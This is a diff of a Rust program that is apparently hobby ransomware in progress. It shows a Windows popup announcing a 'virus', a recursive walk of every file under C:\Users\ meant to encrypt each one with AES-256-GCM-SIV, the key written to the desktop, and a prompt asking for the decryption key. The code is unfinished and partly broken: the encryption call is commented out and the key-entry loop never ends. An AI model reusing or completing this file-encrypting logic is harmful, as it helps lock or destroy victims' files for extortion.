@@ -2,6 +2,7 @@
 #[allow(dead_code)]
 use aes_gcm_siv::aead::generic_array::GenericArray;
 use aes_gcm_siv::aead::Aead;
+use aes_gcm_siv::Error as AesGcmSivError;
 use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
 use crossterm::event::{poll, read, Event, KeyCode};
 use crossterm::terminal::enable_raw_mode;
@@ -12,6 +13,8 @@ use eframe::egui;
 use hex;
 use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
+use std::f32::consts::E;
+use std::fmt;
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::process::Command;
@@ -32,22 +35,30 @@ use walkdir::{DirEntry, Error, WalkDir};
 fn main() {
     // create a popup on windows systems
 
-    let cmd = Command::new("cmd")
+    match Command::new("cmd")
         .arg("/C")
         .arg("start cmd /K echo hello am virus")
         .spawn()
-        .expect("ruh roh");
+    {
+        Ok(child) => {
+            println!("Child process: {:?}", child);
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    }
 
     let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
     let nonce = Nonce::from_slice(&nonce_array);
     let key = Aes256GcmSiv::generate_key(rng);
-    let cipher = Aes256GcmSiv::new(&key);
-    traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
+    let mut cipher = Aes256GcmSiv::new(&key);
+    traverse(true, &mut cipher); //iterates through all the files and calls the encrypt function on each one
     let mut test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
     writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
-    traverse(false, &cipher);
+    println!("Cipher key before user input: {:?}", hex::encode(&key));
+    traverse(false, &mut cipher);
 }
 
 fn display_message() {
@@ -125,23 +136,48 @@ fn test_encryptfile() {
  *
  * FIXME: this will probably mess up some system files, fix later
  */
-fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
+fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
     let mut test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
 
-    //
+    if !do_encrypt {
+        //FIXME: loop here
+        let mut user_input = String::new();
+        loop {
+            //FIXME: thisis the popup stage
+            println!("Enter decryption key pls: ");
+            io::stdin().read_line(&mut user_input).unwrap();
+            let user_input_str = user_input.trim(); //convert to bytes
+
+            //key length 32, nonce length 12
+            if user_input_str.len() != 64 {
+                //64 because it's in hex
+                //print error
+                println!("Invalid key length: {}", user_input_str.len());
+                //FIXME: return here
+            }
+            let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
+            let decrypt_key: GenericArray<u8, U32> =
+                GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+            println!(
+                "Cipher key after user input: {:?}",
+                hex::encode(&decrypt_key)
+            );
+        }
+        let mut test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
+    }
 
     for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
         match entry {
             Ok(entry) => {
                 if entry.file_type().is_file() {
-                    writeln!(
-                        //this is just debug code
-                        test_file.as_ref().unwrap(),
-                        "found file: {}",
-                        entry.path().display()
-                    );
+                    // writeln!(
+                    //     //this is just debug code
+                    //     test_file.as_ref().unwrap(),
+                    //     "found file: {}",
+                    //     entry.path().display()
+                    // );
                     //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
                     //FIXME: herererer
                     if do_encrypt {
@@ -149,24 +185,6 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
 
                         // encrypt(entry.path(), cipher);
                     } else {
-                        let mut user_input = String::new();
-                        //FIXME: thisis the popup stage
-                        println!("Enter decryption key pls: ");
-                        io::stdin().read_line(&mut user_input).unwrap();
-                        let user_input_str = user_input.trim(); //convert to bytes
-
-                        //key length 32, nonce length 12
-                        if user_input_str.len() != 64 {
-                            //64 because it's in hex
-                            //print error
-                            println!("Invalid key length: {}", user_input_str.len());
-                            //FIXME: return here
-                        }
-                        let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
-                        let decrypt_key: GenericArray<u8, U32> =
-                            GenericArray::clone_from_slice(&user_input_bytes.as_slice());
-                        let cipher = Aes256GcmSiv::new(&decrypt_key);
-
                         decrypt(entry.path(), &cipher);
                     }
                 }
@@ -195,6 +213,14 @@ impl From<walkdir::Error> for MyError {
     fn from(err: walkdir::Error) -> Self {
         Self {
             message: err.to_string(),
+        }
+    }
+}
+
+impl From<AesGcmSivError> for MyError {
+    fn from(err: AesGcmSivError) -> Self {
+        Self {
+            message: format!("aes_gcm_siv error: {}", err),
         }
     }
 }
@@ -232,7 +258,7 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
  * Decrypt a file using a given key
  * this is not finished. the main decryption is in main atm
  */
-fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
+fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), MyError> {
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
@@ -242,8 +268,7 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     let ciphertext = &buffer[12..];
 
     // let cipher = Aes256GcmSiv::new(&decrypt_key);
-
-    println!("helloo");
+    println!("decrypting file: {}", path.display());
     match cipher.decrypt(nonce, ciphertext) {
         Ok(plaintext) => {
             println!("Decrypt path: {}", path.display());
@@ -257,12 +282,8 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
         Err(e) => {
             println!("Decrypt fail: {:?}", e); //FIXME: return
                                                //skip fail
-        } // let plaintext = cipher.decrypt(nonce, ciphertext);
-
-          // let mut file = File::create(path)?;
-          // file.set_len(0);
-          // file.write_all(&plaintext.unwrap().as_slice());
-          // break;
+            return Err(e.into());
+        }
     }
 
     Ok(())
